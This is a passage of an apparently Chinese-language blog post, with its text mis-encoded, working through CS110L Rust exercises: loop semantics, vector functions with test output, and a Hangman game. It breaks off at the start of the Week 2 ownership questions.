class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>()&#123;<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">x</span>;<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">true</span> &#123; x = <span class="hljs-number">0x233</span>; <span class="hljs-keyword">break</span>; &#125;<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;0x&#123;:04x&#125;&quot;</span>, x);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs rust">warning: denote infinite loops with `<span class="hljs-keyword">loop</span> &#123; ... &#125;`<br> -<span class="hljs-punctuation">-&gt;</span> src/main.rs:<span class="hljs-number">3</span>:<span class="hljs-number">5</span><br>  |<br><span class="hljs-number">3</span> |     <span class="hljs-keyword">while</span> <span class="hljs-literal">true</span> &#123; x = <span class="hljs-number">0x233</span>; <span class="hljs-keyword">break</span>; &#125;<br>  |     ^^^^^^^^^^ help: <span class="hljs-keyword">use</span> `<span class="hljs-keyword">loop</span>`<br>  |<br>  = note: `<span class="hljs-meta">#[warn(while_true)]</span>` on by default<br><br>error[E0381]: used binding `x` is possibly-uninitialized<br> -<span class="hljs-punctuation">-&gt;</span> src/main.rs:<span class="hljs-number">4</span>:<span class="hljs-number">26</span><br>  |<br><span class="hljs-number">2</span> |     <span class="hljs-keyword">let</span> <span class="hljs-variable">x</span>;<br>  |         - binding declared here but left uninitialized<br><span class="hljs-number">3</span> |     <span class="hljs-keyword">while</span> <span class="hljs-literal">true</span> &#123; x = <span class="hljs-number">0x233</span>; <span class="hljs-keyword">break</span>; &#125;<br>  |           ---- <span class="hljs-keyword">if</span> this condition isn<span class="hljs-symbol">&#x27;t</span> met and the `<span class="hljs-keyword">while</span>` <span class="hljs-keyword">loop</span> runs <span class="hljs-number">0</span> times, `x` is not initialized<br><span class="hljs-number">4</span> |     <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;0x&#123;:04x&#125;&quot;</span>, x);<br>  |                          ^ `x` used here but it is possibly-uninitialized<br>  |<br>  = note: this error originates <span class="hljs-keyword">in</span> the <span class="hljs-keyword">macro</span> `$crate::format_args_nl` which comes from the expansion of the <span class="hljs-keyword">macro</span> `println` (<span class="hljs-keyword">in</span> Nightly builds, run with -Z <span class="hljs-keyword">macro</span>-backtrace <span class="hljs-keyword">for</span> <span class="hljs-variable">more</span> <span class="hljs-keyword">in</span>fo)<br></code></pre></td></tr></table></figure></li><li><p><strong>2.</strong> loop å¯ä»¥é€šè¿‡ break æŠŠå€¼ä¼ é€’å‡ºå»ï¼š</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() &#123;<br>    <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">counter</span> = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">result</span> = <span class="hljs-keyword">loop</span> &#123;<br>        counter += <span class="hljs-number">1</span>;<br><br>        <span class="hljs-keyword">if</span> counter == <span class="hljs-number">10</span> &#123;<br>            <span class="hljs-keyword">break</span> counter * <span class="hljs-number">2</span>;<br>        &#125;<br>    &#125;;<br><br>    <span class="hljs-built_in">assert_eq!</span>(result, <span class="hljs-number">20</span>);<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><p>æœ€åï¼Œæ¯”è¾ƒå¥‡æ€ªçš„æ˜¯ Rust çš„å‡½æ•°ï¼š</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-comment">// Function with return type i32</span><br><span class="hljs-keyword">fn</span> <span class="hljs-title function_">sum</span>(a: <span class="hljs-type">u32</span>, b: <span class="hljs-type">u32</span>) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">u32</span> &#123;<br>    a + b<br>&#125;<br><br><span class="hljs-comment">// Void function (no &quot;-&gt;&quot;)</span><br><span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() &#123;<br>    <span class="hljs-comment">// do stuff...</span><br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;0x&#123;:04x&#125;&quot;</span>,<span class="hljs-title function_ invoke__">sum</span>(<span class="hljs-number">0x1337</span>,<span class="hljs-number">0xc0de</span>));<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-number">0xd415</span><br></code></pre></td></tr></table></figure><ul><li><p>å’Œå˜é‡ç±»å‹ä¸åŒï¼Œå¦‚æœæœ‰è¿”å›å€¼åˆ™éœ€æ‰‹åŠ¨æŒ‡å®šç±»å‹ã€‚</p></li><li><p>å‡½æ•°ä¸ä»…æ²¡æœ‰ return è¿˜å°‘äº†ä¸ªåˆ†å·ã€‚</p><p>Rust æ˜¯ä¸€ç§åŸºäºè¡¨è¾¾å¼çš„è¯­è¨€ã€‚åœ¨ Rust ä¸­ï¼Œä¸€åˆ‡éƒ½æ˜¯è¡¨è¾¾å¼ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> x = someBool ? <span class="hljs-number">2</span> : <span class="hljs-number">4</span>;<br></code></pre></td></tr></table></figure><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">let</span> <span class="hljs-variable">x</span> = <span class="hljs-keyword">if</span> someBool &#123; <span class="hljs-number">2</span> &#125; <span class="hljs-keyword">else</span> &#123; <span class="hljs-number">4</span> &#125;<br></code></pre></td></tr></table></figure><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">fib</span>(n: <span class="hljs-type">i32</span>) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">i32</span> &#123;<br>    <span class="hljs-keyword">if</span> n &lt;= <span class="hljs-number">1</span> &#123; n &#125; <span class="hljs-keyword">else</span> &#123; <span class="hljs-title function_ invoke__">fib</span>(n-<span class="hljs-number">1</span>) + <span class="hljs-title function_ invoke__">fib</span>(n-<span class="hljs-number">2</span>) &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¥½æ€ªå“¦ï¼ˆbushi</p></li></ul><h3 id="Practice"><a class="header-anchor" href="#Practice">Â¶</a>Practice</h3><p>æ‚¨åº”è¯¥å®ç°ä¸‰ä¸ªåŠŸèƒ½ï¼š</p><ul><li>å®ç°<code>add_n</code>ï¼Œå®ƒéœ€è¦ä¸€ä¸ªæ•°å­—å‘é‡å’Œä¸€äº›æ•°å­—<code>n</code>ã€‚è¯¥å‡½æ•°åº”è¿”å›ä¸€ä¸ªæ–°å‘é‡ï¼Œå…¶å…ƒç´ æ˜¯åŸå§‹å‘é‡<code>v</code>ä¸­<code>n</code>æ·»åŠ åˆ°æ¯ä¸ªæ•°å­—çš„æ•°å­—ã€‚</li><li>Implement <code>add_n_inplace</code>ï¼Œå®ƒä¸<code>add_n</code>æ‰§è¡Œç›¸åŒçš„æ“ä½œï¼Œä½† <code>v</code>ç›´æ¥ï¼ˆå°±åœ°ï¼‰ä¿®æ”¹å¹¶ä¸”ä¸è¿”å›ä»»ä½•å†…å®¹ã€‚</li><li>å®ç°<code>dedup</code>ä»å‘é‡ä¸­åˆ é™¤é‡å¤å…ƒç´ ï¼ˆå³<code>v</code>ç›´æ¥ä¿®æ”¹ï¼‰ã€‚å¦‚æœå…ƒç´ åœ¨å‘é‡ä¸­çš„ä»»ä½•ä½ç½®é‡å¤ï¼Œåˆ™åº”ä¿ç•™æœ€å…ˆå‡ºç°çš„å…ƒç´ ã€‚æ‚¨å¯èƒ½å¸Œæœ›ä¸ºæ­¤ä½¿ç”¨ <a href="https://doc.rust-lang.org/std/collections/struct.HashSet.html">HashSet</a>ã€‚</li></ul><p>æ€»ä½“æ¥è¯´å†™çš„è¿˜æ˜¯è›®åˆ«æ‰­çš„ï¼ˆä¸€ä¸ªæ˜¯ mut å®¹æ˜“å¿˜ï¼Œä¸€ä¸ªæ˜¯ <code>&amp;</code> è¿™ä¸ªç©æ„ï¼Œæ¢¦å› C å˜‰å˜‰ğŸ‘¦ğŸ»ï¼‰</p><h4 id="Func1-add-n"><a class="header-anchor" href="#Func1-add-n">Â¶</a>Func1: add_n</h4><p>ä¼ è¿›æ¥çš„æ²¡å¸¦ <code>mut</code> ï¼Œæ–°å¼€ä¸ª vec ç³Šå¼„ä¸€ä¸‹=ã€‚=</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">add_n</span>(v: <span class="hljs-type">Vec</span>&lt;<span class="hljs-type">i32</span>&gt;, n: <span class="hljs-type">i32</span>) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">Vec</span>&lt;<span class="hljs-type">i32</span>&gt; &#123;<br>    <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">i</span> = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">new_v</span> = <span class="hljs-type">Vec</span>::<span class="hljs-title function_ invoke__">new</span>();<br>    <span class="hljs-keyword">while</span> i &lt; v.<span class="hljs-title function_ invoke__">len</span>() &#123;<br>        new_v.<span class="hljs-title function_ invoke__">push</span>(v[i] + n);<br>        i += <span class="hljs-number">1</span>;<br>    &#125;<br>    new_v<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="Func2-add-n-inplace"><a class="header-anchor" href="#Func2-add-n-inplace">Â¶</a>Func2: add_n_inplace</h4><p>è¿™ä¸ªå°±æ¯”è¾ƒç®€å•äº†ã€‚</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">add_n_inplace</span>(v: &amp;<span class="hljs-keyword">mut</span> <span class="hljs-type">Vec</span>&lt;<span class="hljs-type">i32</span>&gt;, n: <span class="hljs-type">i32</span>) &#123;<br>    <span class="hljs-keyword">for</span> <span class="hljs-variable">i</span> <span class="hljs-keyword">in</span> v &#123;<br>        *i += n;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="Func3-dedup"><a class="header-anchor" href="#Func3-dedup">Â¶</a>Func3: dedup</h4><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">dedup</span>(v: &amp;<span class="hljs-keyword">mut</span> <span class="hljs-type">Vec</span>&lt;<span class="hljs-type">i32</span>&gt;) &#123;<br>    <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">hash</span> = HashSet::<span class="hljs-title function_ invoke__">new</span>(); <br>    v.<span class="hljs-title function_ invoke__">retain_mut</span>(|x| <span class="hljs-keyword">if</span> hash.<span class="hljs-title function_ invoke__">contains</span>(&amp;*x) &#123;<br>        <span class="hljs-literal">false</span> <br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        hash.<span class="hljs-title function_ invoke__">insert</span>(*x);<br>        <span class="hljs-literal">true</span><br>    &#125;);<br>&#125;<br></code></pre></td></tr></table></figure><p>è•¾å§†ï¼Œè¿™ä¸ªç©æ„çœŸçš„æ˜¯æ‘ç¿»<a href="https://doc.rust-lang.org/std/vec/struct.Vec.html#method.retain_mut">æ–‡æ¡£</a>æŠ„ä½œä¸šçš„ï¼Œä¸å¾—ä¸è¯´ Rust çš„æ–‡æ¡£å¥½åƒæŒºå…¨çš„ğŸ‘¦ğŸ»</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">pub</span> <span class="hljs-keyword">fn</span> <span class="hljs-title function_">retain_mut</span>&lt;F&gt;(&amp;<span class="hljs-keyword">mut</span> <span class="hljs-keyword">self</span>, f: F)<br><span class="hljs-keyword">where</span><br>    F: <span class="hljs-title function_ invoke__">FnMut</span>(&amp;<span class="hljs-keyword">mut</span> T) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">bool</span>,<br>Retains only the elements specified by the predicate, passing a mutable reference to it.<br><br>In other words, remove all elements e such that <span class="hljs-title function_ invoke__">f</span>(&amp;<span class="hljs-keyword">mut</span> e) returns <span class="hljs-literal">false</span>. This method operates <span class="hljs-keyword">in</span> place, visiting each element exactly once <span class="hljs-keyword">in</span> the original order, and preserves the order of the retained elements.<br><br>Examples<br><span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">vec</span> = <span class="hljs-built_in">vec!</span>[<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>];<br>vec.<span class="hljs-title function_ invoke__">retain_mut</span>(|x| <span class="hljs-keyword">if</span> *x &lt;= <span class="hljs-number">3</span> &#123;<br>    *x += <span class="hljs-number">1</span>;<br>    <span class="hljs-literal">true</span><br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-literal">false</span><br>&#125;);<br><span class="hljs-built_in">assert_eq!</span>(vec, [<span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>]);<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">â¯ cargo <span class="hljs-built_in">test</span><br>   Compiling warmup v0.1.0 (/home/nightu/CS110L/cs110l-spr-2020-starter-code/week1/part-2-warmup)<br>    Finished <span class="hljs-built_in">test</span> [unoptimized + debuginfo] target(s) <span class="hljs-keyword">in</span> 0.39s<br>     Running unittests src/main.rs (target/debug/deps/warmup-d4b1472ea897ae12)<br><br>running 3 tests<br><span class="hljs-built_in">test</span> <span class="hljs-built_in">test</span>::test_add_n ... ok<br><span class="hljs-built_in">test</span> <span class="hljs-built_in">test</span>::test_add_n_inplace ... ok<br><span class="hljs-built_in">test</span> <span class="hljs-built_in">test</span>::test_dedup ... ok<br><br><span class="hljs-built_in">test</span> result: ok. 3 passed; 0 failed; 0 ignored; 0 measured; 0 filtered out; finished <span class="hljs-keyword">in</span> 0.00s<br></code></pre></td></tr></table></figure><h2 id="Part-3-Hangman"><a class="header-anchor" href="#Part-3-Hangman">Â¶</a>Part 3: Hangman</h2><p>å†™èµ·æ¥ä¹Ÿä¸å¤æ‚ï¼Œä¸»è¦æ˜¯å­—ç¬¦ä¸²çš„æ›¿æ¢æœ‰ç‚¹ (â•¯Â°â–¡Â°ï¼‰â•¯ï¸µ â”»â”â”»</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-comment">// Simple Hangman Program</span><br><span class="hljs-comment">// User gets five incorrect guesses</span><br><span class="hljs-comment">// Word chosen randomly from words.txt</span><br><span class="hljs-comment">// Inspiration from: https://doc.rust-lang.org/book/ch02-00-guessing-game-tutorial.html</span><br><span class="hljs-comment">// This assignment will introduce you to some fundamental syntax in Rust:</span><br><span class="hljs-comment">// - variable declaration</span><br><span class="hljs-comment">// - string manipulation</span><br><span class="hljs-comment">// - conditional statements</span><br><span class="hljs-comment">// - loops</span><br><span class="hljs-comment">// - vectors</span><br><span class="hljs-comment">// - files</span><br><span class="hljs-comment">// - user input</span><br><span class="hljs-comment">// We&#x27;ve tried to limit/hide Rust&#x27;s quirks since we&#x27;ll discuss those details</span><br><span class="hljs-comment">// more in depth in the coming lectures.</span><br><span class="hljs-keyword">extern</span> <span class="hljs-keyword">crate</span> rand;<br><span class="hljs-keyword">use</span> rand::Rng;<br><span class="hljs-keyword">use</span> std::fs;<br><span class="hljs-keyword">use</span> std::io;<br><span class="hljs-keyword">use</span> std::io::Write;<br><br><span class="hljs-keyword">const</span> NUM_INCORRECT_GUESSES: <span class="hljs-type">u32</span> = <span class="hljs-number">5</span>;<br><span class="hljs-keyword">const</span> WORDS_PATH: &amp;<span class="hljs-type">str</span> = <span class="hljs-string">&quot;words.txt&quot;</span>;<br><br><span class="hljs-keyword">fn</span> <span class="hljs-title function_">pick_a_random_word</span>() <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">String</span> &#123;<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">file_string</span> = fs::<span class="hljs-title function_ invoke__">read_to_string</span>(WORDS_PATH).<span class="hljs-title function_ invoke__">expect</span>(<span class="hljs-string">&quot;Unable to read file.&quot;</span>);<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">words</span>: <span class="hljs-type">Vec</span>&lt;&amp;<span class="hljs-type">str</span>&gt; = file_string.<span class="hljs-title function_ invoke__">split</span>(<span class="hljs-string">&#x27;\n&#x27;</span>).<span class="hljs-title function_ invoke__">collect</span>();<br>    <span class="hljs-type">String</span>::<span class="hljs-title function_ invoke__">from</span>(words[rand::<span class="hljs-title function_ invoke__">thread_rng</span>().<span class="hljs-title function_ invoke__">gen_range</span>(<span class="hljs-number">0</span>, words.<span class="hljs-title function_ invoke__">len</span>())].<span class="hljs-title function_ invoke__">trim</span>())<br>&#125;<br><br><span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() &#123;<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">secret_word</span> = <span class="hljs-title function_ invoke__">pick_a_random_word</span>();<br>    <span class="hljs-comment">// Note: given what you know about Rust so far, it&#x27;s easier to pull characters out of a</span><br>    <span class="hljs-comment">// vector than it is to pull them out of a string. You can get the ith character of</span><br>    <span class="hljs-comment">// secret_word by doing secret_word_chars[i].</span><br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">secret_word_chars</span>: <span class="hljs-type">Vec</span>&lt;<span class="hljs-type">char</span>&gt; = secret_word.<span class="hljs-title function_ invoke__">chars</span>().<span class="hljs-title function_ invoke__">collect</span>();<br>    <span class="hljs-comment">// Uncomment for debugging:</span><br>    <span class="hljs-comment">// println!(&quot;[!Debug] random word: &#123;&#125;&quot;, secret_word);</span><br><br>    <span class="hljs-comment">// Your code here! :)</span><br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;Welcome to CS110L Hangman!&quot;</span>);<br>    <span class="hljs-comment">// Main</span><br>    <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">r_cnt</span> = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">l_cnt</span> = NUM_INCORRECT_GUESSES;<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">length</span> = secret_word.<span class="hljs-title function_ invoke__">len</span>();<br>    <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">now_guesss</span> = <span class="hljs-type">String</span>::<span class="hljs-title function_ invoke__">with_capacity</span>(length);<br>    <span class="hljs-keyword">for</span> <span class="hljs-variable">_</span> <span class="hljs-keyword">in</span> <span class="hljs-number">0</span>..length &#123;<br>        now_guesss.<span class="hljs-title function_ invoke__">push</span>(<span class="hljs-string">&#x27;-&#x27;</span>);<br>    &#125;<br><br>    <span class="hljs-title function_ invoke__">while</span> (r_cnt != length) &amp;&amp; (l_cnt &gt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;The word so far is &#123;&#125;&quot;</span>, now_guesss);<br>        <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;You have &#123;&#125; guesses left&quot;</span>, l_cnt);<br>        <span class="hljs-built_in">print!</span>(<span class="hljs-string">&quot;Please guess a letter: &quot;</span>);<br>        <span class="hljs-comment">// Make sure the prompt from the previous line gets displayed:</span><br>        io::<span class="hljs-title function_ invoke__">stdout</span>().<span class="hljs-title function_ invoke__">flush</span>().<span class="hljs-title function_ invoke__">expect</span>(<span class="hljs-string">&quot;Error flushing stdout.&quot;</span>);<br>        <span class="hljs-comment">// Read a letter</span><br>        <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">guess</span> = <span class="hljs-type">String</span>::<span class="hljs-title function_ invoke__">new</span>();<br>        io::<span class="hljs-title function_ invoke__">stdin</span>()<br>            .<span class="hljs-title function_ invoke__">read_line</span>(&amp;<span class="hljs-keyword">mut</span> guess)<br>            .<span class="hljs-title function_ invoke__">expect</span>(<span class="hljs-string">&quot;Error reading line.&quot;</span>);<br>        <span class="hljs-comment">// Remain only-first-char string</span><br>        guess.<span class="hljs-title function_ invoke__">truncate</span>(<span class="hljs-number">1</span>);<br>        <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">guess_right</span> = <span class="hljs-literal">false</span>;<br>        <span class="hljs-keyword">for</span> <span class="hljs-variable">i</span> <span class="hljs-keyword">in</span> <span class="hljs-number">0</span>..secret_word.<span class="hljs-title function_ invoke__">len</span>() &#123;<br>            <span class="hljs-keyword">if</span> guess.<span class="hljs-title function_ invoke__">chars</span>().<span class="hljs-title function_ invoke__">nth</span>(<span class="hljs-number">0</span>).<span class="hljs-title function_ invoke__">unwrap</span>() == secret_word_chars[i] &#123;<br>                now_guesss.<span class="hljs-title function_ invoke__">replace_range</span>(i..i + <span class="hljs-number">1</span>, &amp;guess);<br>                r_cnt += <span class="hljs-number">1</span>;<br>                guess_right = <span class="hljs-literal">true</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">if</span> !guess_right &#123;<br>            l_cnt -= <span class="hljs-number">1</span>;<br>        &#125;;<br>    &#125;<br>    <span class="hljs-keyword">if</span> r_cnt == length &#123;<br>        <span class="hljs-built_in">println!</span>(<br>            <span class="hljs-string">&quot;Congratulations! You have guessed the correct word &#123;&#125;!&quot;</span>,<br>            secret_word<br>        );<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;Sorry. The correct word is &#123;&#125;!&quot;</span>, secret_word);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash">â¯ cargo run<br>    Finished dev [unoptimized + debuginfo] target(s) <span class="hljs-keyword">in</span> 0.01s<br>     Running `target/debug/hangman`<br>Welcome to CS110L Hangman!<br>The word so far is ------<br>You have 5 guesses left<br>Please guess a letter: n<br>The word so far is n-----<br>You have 5 guesses left<br>Please guess a letter: i<br>The word so far is ni----<br>You have 5 guesses left<br>Please guess a letter: g<br>The word so far is nig---<br>You have 5 guesses left<br>Please guess a letter: t<br>The word so far is nig-t-<br>You have 5 guesses left<br>Please guess a letter: u<br>The word so far is nig-tu<br>You have 5 guesses left<br>Please guess a letter: h<br>Congratulations! You have guessed the correct word nightu!<br></code></pre></td></tr></table></figure><h1>Week 2 Exercises: Ownership and structs</h1><h2 id="Purpose-v2"><a class="header-anchor" href="#Purpose-v2">Â¶</a>Purpose</h2><ul><li>æ‰€æœ‰æƒ/å¼•ç”¨çš„ä¸€äº›ç»ƒä¹ </li><li>åˆæ­¥äº†è§£ Rust çš„é¢å‘å¯¹è±¡ç¼–ç¨‹</li></ul><h2 id="Part-1-Ownership-short-answer-exercises"><a class="header-anchor" href="#Part-1-Ownership-short-answer-exercises">Â¶</a>Part 1: Ownership short-answer exercises</h2><p>ä¸‹åˆ—ä»£ç èƒ½å¦æ­£å¸¸è¿è¡Œï¼Œä¸èƒ½è¯·ç®€ç­”åŸå› ã€‚</p><ul><li><p>Example 1:</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() &#123;<br>    <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">s</span> = <span class="hljs-type">String</span>::<span class="hljs-title function_ invoke__">from</span>(<span class="hljs-string">&quot;hello&quot;</span>);<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">ref1</span> = &amp;s;<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">ref2</span> = &amp;ref1;<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">ref3</span> = &amp;ref2;<br>    s = <span class="hljs-type">String</span>::<span class="hljs-title function_ invoke__">from</span>(<span class="hljs-string">&quot;goodbye&quot;</span>);<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;&#123;&#125;&quot;</span>, ref3.<span class="hljs-title function_ invoke__">to_uppercase</span>());<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¸€å±‚å¼•ç”¨å¥—ä¸€å±‚å¼•ç”¨çš„æ„Ÿè§‰éå¸¸ç„å­¦ï¼Œè¿™é‡Œå…ˆä»é˜²æ­¢æŠ¥é”™çš„æ€è·¯è¿›è¡Œç²—ç•¥çš„å­¦ä¹ 